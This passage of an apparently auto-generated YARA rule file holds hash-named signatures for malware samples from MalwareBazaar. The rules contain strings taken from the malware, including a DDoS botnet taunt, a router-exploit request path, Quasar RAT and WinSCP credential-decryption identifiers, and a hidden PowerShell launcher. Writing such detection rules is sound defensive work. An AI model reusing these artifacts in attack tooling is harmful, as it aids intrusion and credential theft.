        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
        $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
        $s6 = "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s7 = "dayzddos.co runs you if you read this lol then you tcp dumped it because it hit you and you need to patch it lololololol"
        $s8 = "%s %s HTTP/1.1"
        $s9 = "User-Agent: %s"
        $s10 = "Connection: close"
        $s11 = "%s /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s12 = "HTTPSTOPM"
        $s13 = "HTTP"
        $s14 = "No such file or directory"
        $s15 = "No such process"
        $s16 = "Interrupted system call"
        $s17 = "Bad file descriptor"
        $s18 = "No child processes"
        $s19 = "Resource temporarily unavailable"
        $s20 = "File exists"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 92KB and
        all of them
}

rule Linux_ad0dd692f4de9d060a918c63ded562d8cb8b8217fc6831fa46aac15c0fdb422b
{
    meta:
        description = "Auto ML: ad0dd692f4de9d060a918c63ded562d8cb8b8217fc6831fa46aac15c0fdb422b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Linux_ad804a6b102674a2ad43a40be16385324ec53bb6a1e56ebd4f5fec1ca208e245
{
    meta:
        description = "Auto ML: ad804a6b102674a2ad43a40be16385324ec53bb6a1e56ebd4f5fec1ca208e245"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 140KB and
        all of them
}

rule Windows_adb4413373b3a814a8b2268bfb098c81459ddd0f755b4d2a7972432cfbdcf5cf
{
    meta:
        description = "Auto ML: adb4413373b3a814a8b2268bfb098c81459ddd0f755b4d2a7972432cfbdcf5cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "1DSFEWRWE.exe"
        $s6 = "System"
        $s7 = "System.Runtime.CompilerServices"
        $s8 = "System.Diagnostics"
        $s9 = "ProcessStartInfo"
        $s10 = "set_FileName"
        $s11 = "set_Arguments"
        $s12 = "ProcessWindowStyle"
        $s13 = "set_WindowStyle"
        $s14 = "set_CreateNoWindow"
        $s15 = "Process"
        $s16 = "mscoree.dll"
        $s17 = "powershell"
        $s18 = "VarFileInfo"
        $s19 = "StringFileInfo"
        $s20 = "FileDescription"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB and
        all of them
}

rule Android_adb7cba1d60f35b90d8d178da2eac4a157e5d05f78914847584022cdf3c91afa
{
    meta:
        description = "Auto ML: adb7cba1d60f35b90d8d178da2eac4a157e5d05f78914847584022cdf3c91afa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cmdccC&"
        $s2 = "classes.dex/layout/abc_action_mode_close_item_material.xml"
        $s3 = "resources.arsc/layout/loading.xml"
        $s4 = "AndroidManifest.xml/layout/notification_template_custom_big.xml"
        $s5 = "resources.arsc/layout/notification_template_icon_group.xml"
        $s6 = "classes.dex/layout/notification_template_part_chronometer.xmlm"
        $s7 = "AndroidManifest.xml/layout/notification_template_part_time.xmlm"
        $s8 = "..res/layout/notification_template_part_time.xml"
        $s9 = "55res/layout/notification_template_part_chronometer.xml"
        $s10 = "//res/layout/notification_template_icon_group.xml"
        $s11 = "//res/layout/notification_template_custom_big.xml"
        $s12 = "res/layout/loading.xml"
        $s13 = "22res/layout/abc_action_mode_close_item_material.xml"
        $s14 = "System Keyboard"
        $s15 = ",,androidx.appcompat.app.AppCompatViewInflater"
        $s16 = "!!opensjimiijgdriaylakygximnxhio917"
        $s17 = "))BahisLion phone has a reliable connection"
        $s18 = "Something went wrong verifying BahisLion phone number by SMS. Check that BahisLion phone has a reliable connection and can send and receive SMS."
        $s19 = "If using a dual SIM phone, BahisLion may need to switch BahisLion default SIM and remove the other SIM while setting up payments."
        $s20 = "%%creatureshkeejxhthwsetxikehjgebpxg777"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 3873KB and
        all of them
}

rule Windows_add8f6dd03aacc83d719d518343a9e3b150b6e23392c491c3ace8362b1c52740
{
    meta:
        description = "Auto ML: add8f6dd03aacc83d719d518343a9e3b150b6e23392c491c3ace8362b1c52740"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "advapi32.dll"
        $s7 = "setupx.dll"
        $s8 = "setupapi.dll"
        $s9 = "advpack.dll"
        $s10 = "wininit.ini"
        $s11 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s12 = "HeapSetInformation"
        $s13 = "DecryptFileA"
        $s14 = "SHOWWINDOW"
        $s15 = "ADMQCMD"
        $s16 = "USRQCMD"
        $s17 = "LoadString() Error.  Could not load string resource."
        $s18 = "FILESIZES"
        $s19 = "UPDFILE%lu"
        $s20 = ".text$mn"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1445KB and
        all of them
}

rule Windows_ae4f8c4cf49d93930683e363a285cd39f8d2e2a1bc4ae8e94fe44d8a6d085eff
{
    meta:
        description = "Auto ML: ae4f8c4cf49d93930683e363a285cd39f8d2e2a1bc4ae8e94fe44d8a6d085eff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "CloseHandle"
        $s5 = "ConnectNamedPipe"
        $s6 = "CreateFileA"
        $s7 = "CreateNamedPipeA"
        $s8 = "CreateThread"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetCurrentProcess"
        $s11 = "GetCurrentProcessId"
        $s12 = "GetCurrentThreadId"
        $s13 = "GetLastError"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetStartupInfoA"
        $s17 = "GetSystemTimeAsFileTime"
        $s18 = "GetTickCount"
        $s19 = "ReadFile"
        $s20 = "RtlVirtualUnwind"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19KB and
        all of them
}

rule Windows_ae7a22bede40e897e2d01ac036f9f16f283082e34ef868443621545ec21d5753
{
    meta:
        description = "Auto ML: ae7a22bede40e897e2d01ac036f9f16f283082e34ef868443621545ec21d5753"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s6 = "System.Drawing.Point"
        $s7 = "System.Drawing.Icon"
        $s8 = "System.Drawing.Size"
        $s9 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s10 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADF?w|"
        $s11 = "System.Drawing.Bitmap"
        $s12 = "ywIN"
        $s13 = "Tori.exe"
        $s14 = "System.Runtime.CompilerServices"
        $s15 = "<Module>"
        $s16 = "kernel32.dll"
        $s17 = "System"
        $s18 = "Module"
        $s19 = "System.Reflection"
        $s20 = "System.IO"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 735KB and
        all of them
}

rule Windows_123c4f2b6906e48abd2d541d78d10500e458804bfd9f83650d1a748511a7857f
{
    meta:
        description = "Auto ML: 123c4f2b6906e48abd2d541d78d10500e458804bfd9f83650d1a748511a7857f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "Connector color."
        $s6 = "KAn activity with Activation set to 'True' must not be inside loop activity."
        $s7 = "PAn activity with Activation set to 'True' must be the first executable activity."
        $s8 = "Operation cannot be completed since the request context cannot be signaled at this time. Make sure workflow is not unloaded between synchronous request response operation."
        $s9 = "yCorrelation value specified does not match the already initialized correlation value on declaration {0} for activity {1}."
        $s10 = "'Correlation '{0}' is already specified."
        $s11 = "MThere is already an activity with name '{0}'.  Activity names must be unique."
        $s12 = "CompositeActivity '{0}' status is currently '{1}'. Dynamic modifications are allowed only when the activity status is 'Initialized' or 'Closed'."
        $s13 = "CompositeActivity '{0}' status is currently '{1}'. Workflow changes are allowed only when the activity status is 'Initialized' or 'Closed'."
        $s14 = "uThe target workflow must not have an activity that implements an WebServiceInputActivity with Activation set to True."
        $s15 = "_An instance of ExternalDataExchangeService of type {0} already exists in the runtime container."
        $s16 = "$Could not start the target workflow."
        $s17 = "CWorkflow definition for invoked workflow '{0}' could not be loaded."
        $s18 = "`The workflow instance received the web service request but unloaded before sending the response."
        $s19 = ":Activity '{0}' does not have CorrelationToken property set"
        $s20 = "2Cannot find property '{0}' on the target activity."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1209KB and
        all of them
}

rule Linux_ae9af46d1534c25940cd5ed2770925749487782a176fc95de9437bd86acbb444
{
    meta:
        description = "Auto ML: ae9af46d1534c25940cd5ed2770925749487782a176fc95de9437bd86acbb444"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB and
        all of them
}

rule Linux_aec176a9c4563b039872b19219404e0e362c0b098d87fb8f17a4e904119531db
{
    meta:
        description = "Auto ML: aec176a9c4563b039872b19219404e0e362c0b098d87fb8f17a4e904119531db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "__vdso_clock_gettime"
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 89KB and
        all of them
}

rule Windows_aecd2f2e09747a3832fc47bf43bcbba53b33bc980bc07764b04a3fa189b5dade
{
    meta:
        description = "Auto ML: aecd2f2e09747a3832fc47bf43bcbba53b33bc980bc07764b04a3fa189b5dade"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_Panel1"
        $s5 = "get_Panel2"
        $s6 = "<Module>"
        $s7 = "get_GUID"
        $s8 = "set_GUID"
        $s9 = "get_ASCII"
        $s10 = "System.IO"
        $s11 = "System.Data"
        $s12 = "SetupRecordingsData"
        $s13 = "SetupEventsData"
        $s14 = "System.Collections.Generic"
        $s15 = "Read"
        $s16 = "Thread"
        $s17 = "Load"
        $s18 = "fileSystemWatcher1_Changed"
        $s19 = "chkBoxProcessSchedule_CheckedChanged"
        $s20 = "get_Checked"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 696KB and
        all of them
}

rule Windows_aeee946a8b8cb886a3a21a0fc3038ca5dda82d9a63b4adbb8fee6f6845316a92
{
    meta:
        description = "Auto ML: aeee946a8b8cb886a3a21a0fc3038ca5dda82d9a63b4adbb8fee6f6845316a92"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = "CLRCreateInstance"
        $s17 = "CreateFullTrustSandbox"
        $s18 = ".text$di"
        $s19 = ".text$mn"
        $s20 = ".text$mn$00"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 978KB and
        all of them
}

rule Windows_af0d6bb22a652911676557ea97cfbc85968d22b1124a1b3ca8989ac5a36e5f27
{
    meta:
        description = "Auto ML: af0d6bb22a652911676557ea97cfbc85968d22b1124a1b3ca8989ac5a36e5f27"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4755KB and
        all of them
}

rule Windows_af2a0d3a997ab4aacd34c2cb383ff7572f46898035ce7b958a98df6b431591f5
{
    meta:
        description = "Auto ML: af2a0d3a997ab4aacd34c2cb383ff7572f46898035ce7b958a98df6b431591f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "tJvit3OSTfReAdRaD9t"
        $s14 = "<Module>{133D5916-22F7-4C5F-A164-B9D3396F7EC0}"
        $s15 = "System.Text"
        $s16 = "get_Length"
        $s17 = "get_Chars"
        $s18 = "System.Collections.Generic"
        $s19 = "System.Linq"
        $s20 = "GetEnumerator"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1547KB and
        all of them
}

rule Linux_af7927deb6c32424f448ce6e590dd53ad121a4a62aa9bd586b29a604a7b03b38
{
    meta:
        description = "Auto ML: af7927deb6c32424f448ce6e590dd53ad121a4a62aa9bd586b29a604a7b03b38"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB and
        all of them
}

rule Windows_afb24fab9c0b0f9e60d81bd7fd2d7999c842bf00b5bb9e0bf7347e36eacafad7
{
    meta:
        description = "Auto ML: afb24fab9c0b0f9e60d81bd7fd2d7999c842bf00b5bb9e0bf7347e36eacafad7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3477KB and
        all of them
}

rule Windows_afd7592da43e21b2731f1fd0e3c11b95e5d87ce3ef2967240089331c7bb367d6
{
    meta:
        description = "Auto ML: afd7592da43e21b2731f1fd0e3c11b95e5d87ce3ef2967240089331c7bb367d6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_Panel1"
        $s5 = "get_Panel2"
        $s6 = "<Module>"
        $s7 = "get_TEAM_A"
        $s8 = "System.IO"
        $s9 = "get_Fecha"
        $s10 = "set_Fecha"
        $s11 = "set_UseMnemonic"
        $s12 = "System.Collections.Generic"
        $s13 = "get_Enabled"
        $s14 = "set_Enabled"
        $s15 = "set_FormattingEnabled"
        $s16 = "set_Sorted"
        $s17 = "get_BirthdateFormatted"
        $s18 = "set_BirthdateFormatted"
        $s19 = "get_FlatAppearance"
        $s20 = "set_SplitterDistance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 786KB and
        all of them
}

rule Windows_b012a728ee730420d06896b13cfd47e32648eb8b7830850709ebebb0f154b796
{
    meta:
        description = "Auto ML: b012a728ee730420d06896b13cfd47e32648eb8b7830850709ebebb0f154b796"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 293KB and
        all of them
}

rule Windows_123ff21851f3b1e11f928142fc0b48c00acab2971d7e7c0e77d936de1916922c
{
    meta:
        description = "Auto ML: 123ff21851f3b1e11f928142fc0b48c00acab2971d7e7c0e77d936de1916922c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 758KB and
        all of them
}

rule Windows_b023eaad2a07154df78306aa1295197c7f766c6adda7481318cff984a4125092
{
    meta:
        description = "Auto ML: b023eaad2a07154df78306aa1295197c7f766c6adda7481318cff984a4125092"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = "kernel32H9"
        $s17 = ".dllu"
        $s18 = ">.exeu"
        $s19 = "thread"
        $s20 = "Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2271KB and
        all of them
}

rule Windows_b0810d72555442341dd38d894b2551d1823613bcb747e19ce511da4d5fde3903
{
    meta:
        description = "Auto ML: b0810d72555442341dd38d894b2551d1823613bcb747e19ce511da4d5fde3903"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 315KB and
        all of them
}

rule Linux_b092b5cea68faaf87e9816ec8592b5115a4672d077a284b7e48244288e23b1da
{
    meta:
        description = "Auto ML: b092b5cea68faaf87e9816ec8592b5115a4672d077a284b7e48244288e23b1da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB and
        all of them
}

rule Linux_b09599831148244a70724577f4ec0cb9b8f344632f3bc6e2e542fbafa9e378cf
{
    meta:
        description = "Auto ML: b09599831148244a70724577f4ec0cb9b8f344632f3bc6e2e542fbafa9e378cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB and
        all of them
}

rule Linux_b0a737ad8626d2c04e1a094d462744a717c05c85b8207ed2249cb68c3fd32db6
{
    meta:
        description = "Auto ML: b0a737ad8626d2c04e1a094d462744a717c05c85b8207ed2249cb68c3fd32db6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/bin/systemd"
        $s7 = "bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 83KB and
        all of them
}

rule Windows_b0acb9c4b82cf91707edebf55391a6b323870ea3524bc242fd5ab218db25b102
{
    meta:
        description = "Auto ML: b0acb9c4b82cf91707edebf55391a6b323870ea3524bc242fd5ab218db25b102"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "togetherUponmovedaCtheirreplenish,4sea.m"
        $s7 = "DefWindowProcW"
        $s8 = "FlsSetValue"
        $s9 = "FlsGetValue"
        $s10 = "CorExitProcess"
        $s11 = "An application has made an attempt to load the C runtime library incorrectly."
